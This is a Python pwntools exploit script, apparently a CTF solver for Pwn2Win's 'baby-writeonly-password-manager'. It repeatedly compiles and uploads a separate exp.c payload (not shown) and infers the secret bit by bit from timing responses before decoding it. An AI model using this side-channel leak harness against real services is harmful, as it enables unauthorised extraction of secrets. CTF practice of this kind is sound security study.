#!/usr/bin/python

from pwn import *
import sys
import time
import os

remote_ip, port = 'baby-writeonly-password-manager.pwn2win.party', 1337

context.log_level = "debug"

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
snd = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

if len(sys.argv) > 1:
    remote_ip = 'baby-writeonly-password-manager-2.pwn2win.party'

out = []
for i in range(0x12):
    new = "0b"
    for j in range(7,-1,-1):
        io = remote(remote_ip, port)
        context.noptrace = True
        os.system("gcc -D ITER1={} -D ITER2={} exp.c -o exp".format(i, j))
        f = open("./exp", "r")
        data = f.read()
        sla("(max: 30000)\n", str(len(data)))
        sa("Send 'em!\n", data)
        io.recvuntil("connected to the server..\n")
        num = int(float(io.recv().strip("\n")))
        if num < 200:
            new += '1'
        else:
            new += '0'
        io.close()
    out.append(new)
    print(new)


print(out)

def int2bin(i):
    return int(i, 2)

i = list(map(int2bin, out))
print("".join([chr(j) for j in i]))